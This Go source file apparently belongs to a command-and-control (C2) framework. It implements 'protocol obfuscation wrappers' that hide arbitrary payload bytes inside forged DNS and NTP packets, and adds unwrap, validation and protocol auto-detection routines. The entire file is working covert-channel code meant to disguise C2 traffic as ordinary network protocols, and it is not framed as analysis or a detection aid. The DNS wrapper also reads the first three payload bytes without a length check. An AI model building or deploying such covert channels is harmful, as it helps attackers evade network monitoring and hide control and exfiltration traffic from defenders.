package c2

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)



// ProtocolWrapper defines the interface for protocol obfuscation wrappers
type ProtocolWrapper interface {
	// Wrap wraps the payload in the protocol
	Wrap(payload []byte) ([]byte, error)
	// Unwrap extracts the payload from the protocol
	Unwrap(data []byte) ([]byte, error)
	// IsValid checks if the data is valid for this protocol
	IsValid(data []byte) bool
}

// DNSHeader represents a simplified DNS header structure
type DNSHeader struct {
	ID      uint16
	Flags   uint16
	QDCount uint16
	ANCount uint16
	NSCount uint16
	ARCount uint16
}

// DNSQuestion represents a simplified DNS question
type DNSQuestion struct {
	Name  []byte
	Type  uint16
	Class uint16
}

// DNSRecord represents a simplified DNS record
type DNSRecord struct {
	Name     []byte
	Type     uint16
	Class    uint16
	TTL      uint32
	RDLength uint16
	RData    []byte
}

// DNSWrapper implements ProtocolWrapper for DNS obfuscation
type DNSWrapper struct {
	Domain string
}

// NewDNSWrapper creates a new DNS wrapper with the given domain
func NewDNSWrapper(domain string) *DNSWrapper {
	if domain == "" {
		domain = "example.com"
	}
	return &DNSWrapper{Domain: domain}
}

// Wrap wraps the payload in a DNS query/response
func (w *DNSWrapper) Wrap(payload []byte) ([]byte, error) {
	var buf bytes.Buffer

	// Create DNS header
	header := DNSHeader{
		ID:      0x1234, // Random ID
		Flags:   0x0100, // Standard query
		QDCount: 1,      // One question
		ANCount: 1,      // One answer
	}

	// Write header
	if err := binary.Write(&buf, binary.BigEndian, header); err != nil {
		return nil, err
	}

	// Create and write question
	// Use the first 1-3 bytes of payload as subdomain
	subdomain := fmt.Sprintf("%02x%02x%02x", payload[0], payload[1], payload[2])
	domain := fmt.Sprintf("%s.%s.", subdomain, w.Domain)

	// Write domain name in DNS format (length-prefixed labels)
	for _, label := range strings.Split(domain, ".") {
		if label == "" {
			buf.WriteByte(0) // End of domain name
			continue
		}
		buf.WriteByte(byte(len(label)))
		buf.WriteString(label)
	}

	// Write question type and class
	binary.Write(&buf, binary.BigEndian, uint16(0x00FF)) // TYPE: ANY
	binary.Write(&buf, binary.BigEndian, uint16(0x0001)) // CLASS: IN

	// Create and write answer
	// Write domain name (pointer to question domain)
	buf.WriteByte(0xC0)
	buf.WriteByte(0x0C) // Pointer to offset 12

	// Write answer type, class, TTL, and data length
	binary.Write(&buf, binary.BigEndian, uint16(0x00FF))       // TYPE: ANY
	binary.Write(&buf, binary.BigEndian, uint16(0x0001))       // CLASS: IN
	binary.Write(&buf, binary.BigEndian, uint32(60))           // TTL: 60 seconds
	binary.Write(&buf, binary.BigEndian, uint16(len(payload))) // Data length

	// Write the actual payload as RData
	buf.Write(payload)

	return buf.Bytes(), nil
}

// Unwrap extracts the payload from a DNS packet
func (w *DNSWrapper) Unwrap(data []byte) ([]byte, error) {
	if len(data) < 12 { // Minimum DNS header length
		return nil, fmt.Errorf("dns: packet too short")
	}

	// Parse DNS header
	var header DNSHeader
	if err := binary.Read(bytes.NewReader(data[:12]), binary.BigEndian, &header); err != nil {
		return nil, err
	}

	// Skip question section
	pos := 12
	for i := 0; i < int(header.QDCount); i++ {
		// Skip domain name
		for {
			if pos >= len(data) {
				return nil, fmt.Errorf("dns: incomplete packet")
			}
			length := int(data[pos])
			pos++
			if length == 0 {
				break
			}
			pos += length
		}
		// Skip type and class (4 bytes)
		pos += 4
	}

	// Extract payload from answer section
	for i := 0; i < int(header.ANCount); i++ {
		// Skip domain name
		if pos >= len(data) {
			return nil, fmt.Errorf("dns: incomplete packet")
		}
		if data[pos]&0xC0 == 0xC0 { // Pointer
			pos += 2
		} else { // Full domain name
			for {
				if pos >= len(data) {
					return nil, fmt.Errorf("dns: incomplete packet")
				}
				length := int(data[pos])
				pos++
				if length == 0 {
					break
				}
				pos += length
			}
		}

		// Skip type and class (4 bytes)
		pos += 4
		// Skip TTL (4 bytes)
		pos += 4
		// Read data length
		if pos+2 > len(data) {
			return nil, fmt.Errorf("dns: incomplete packet")
		}
		dataLen := binary.BigEndian.Uint16(data[pos : pos+2])
		pos += 2

		// Read the payload
		if pos+int(dataLen) > len(data) {
			return nil, fmt.Errorf("dns: incomplete packet")
		}
		payload := data[pos : pos+int(dataLen)]
		return payload, nil
	}

	return nil, fmt.Errorf("dns: no answer section found")
}

// IsValid checks if the data is a valid DNS packet
func (w *DNSWrapper) IsValid(data []byte) bool {
	if len(data) < 12 { // Minimum DNS header length
		return false
	}

	var header DNSHeader
	if err := binary.Read(bytes.NewReader(data[:12]), binary.BigEndian, &header); err != nil {
		return false
	}

	// Basic DNS packet validation
	return header.ID > 0 && (header.QDCount > 0 || header.ANCount > 0)
}

// NTPPacket represents a simplified NTP packet structure
type NTPPacket struct {
	LiVnMode     uint8
	Stratum      uint8
	Poll         int8
	Precision    int8
	RootDelay    uint32
	RootDisp     uint32
	RefID        uint32
	RefTimeSec   uint32
	RefTimeFrac  uint32
	OrigTimeSec  uint32
	OrigTimeFrac uint32
	RxTimeSec    uint32
	RxTimeFrac   uint32
	TxTimeSec    uint32
	TxTimeFrac   uint32
}

// NTPWrapper implements ProtocolWrapper for NTP obfuscation
type NTPWrapper struct{}

// NewNTPWrapper creates a new NTP wrapper
func NewNTPWrapper() *NTPWrapper {
	return &NTPWrapper{}
}

// Wrap wraps the payload in an NTP packet
func (w *NTPWrapper) Wrap(payload []byte) ([]byte, error) {
	var buf bytes.Buffer

	// Create NTP packet
	packet := NTPPacket{
		LiVnMode:     0x1B, // Leap indicator 0, Version 4, Mode 3 (client)
		Stratum:      1,
		Poll:         6,
		Precision:    -20,
		RootDelay:    0,
		RootDisp:     0,
		RefID:        0x73657276, // "serv"
		RefTimeSec:   uint32(time.Now().Unix()),
		RefTimeFrac:  0,
		OrigTimeSec:  0,
		OrigTimeFrac: 0,
		RxTimeSec:    0,
		RxTimeFrac:   0,
		TxTimeSec:    uint32(time.Now().Unix()),
		TxTimeFrac:   0,
	}

	// Write NTP packet
	if err := binary.Write(&buf, binary.BigEndian, packet); err != nil {
		return nil, err
	}

	// Append payload
	buf.Write(payload)

	return buf.Bytes(), nil
}

// Unwrap extracts the payload from an NTP packet
func (w *NTPWrapper) Unwrap(data []byte) ([]byte, error) {
	if len(data) < 48 { // Minimum NTP packet length
		return nil, fmt.Errorf("ntp: packet too short")
	}

	// The payload is everything after the NTP packet header
	return data[48:], nil
}

// IsValid checks if the data is a valid NTP packet
func (w *NTPWrapper) IsValid(data []byte) bool {
	if len(data) < 48 { // Minimum NTP packet length
		return false
	}

	// Basic NTP packet validation (check version in LiVnMode byte)
	liVnMode := data[0]
	version := (liVnMode >> 3) & 0x07
	return version == 3 || version == 4
}

// GetProtocolWrapper creates a ProtocolWrapper based on the protocol type
func GetProtocolWrapper(protocol ProtocolType, params ...string) ProtocolWrapper {
	switch protocol {
	case ProtocolDNS:
		domain := "example.com"
		if len(params) > 0 {
			domain = params[0]
		}
		return NewDNSWrapper(domain)
	case ProtocolNTP:
		return NewNTPWrapper()
	default:
		return nil
	}
}

// DetectProtocol automatically detects the protocol type from the data
func DetectProtocol(data []byte) ProtocolType {
	// Try DNS first
	dns := NewDNSWrapper("")
	if dns.IsValid(data) {
		return ProtocolDNS
	}

	// Try NTP
	ntp := NewNTPWrapper()
	if ntp.IsValid(data) {
		return ProtocolNTP
	}

	return ProtocolNone
}
